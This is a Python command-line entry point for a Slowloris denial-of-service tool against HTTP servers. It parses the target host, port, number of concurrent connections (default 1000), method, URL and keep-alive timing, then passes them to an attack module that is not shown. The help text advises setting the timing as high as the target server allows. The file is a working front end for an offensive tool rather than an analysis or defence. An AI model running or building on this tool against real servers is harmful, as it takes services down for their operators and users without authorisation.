from argparse import ArgumentParser

from .loris import loris

parser = ArgumentParser(
    prog="Slow Loris DoS",
    description="Slow Loris, a low bandwidth denial of service tool for http servers"
)

# Positional
parser.add_argument("host", help="Target host IPv4 or IPv6 address")

# Options
parser.add_argument(
    "-p",
    "--port",
    default=80,
    help="Http server port. (80: http, 443:https)",
    type=int
)
parser.add_argument(
    "-c",
    "--connections",
    default=1000,
    help="Number of concurrent connections to open",
    type=int,
)
parser.add_argument(
    "-m",
    "--method",
    default="GET",
    help="Type of method to send in http start-line",
    type=str,
)
parser.add_argument(
    "-u",
    "--url",
    default="/",
    help="URL to set in http start-line",
    type=str,
)
parser.add_argument(
    "-t",
    "--timing",
    default=3,
    help="Time (in seconds) between keep-alive header transmissions. Optimally it's as high as the server allows.",
    type=float,
)
parser.add_argument(
    "-pc",
    "--prevent-cache",
    default=True,
    dest="prevent_cache",
    help="Prevent caching by sending a randomized get parameter",
    type=bool,
)

def main():
    args = parser.parse_args()

    loris.loris(
        host = args.host,
        port = args.port,
        n = args.connections,
        timing = args.timing,
        prevent_cache = args.prevent_cache,
        url = args.url,
        method = args.method
    )

if __name__ == '__main__':
    main()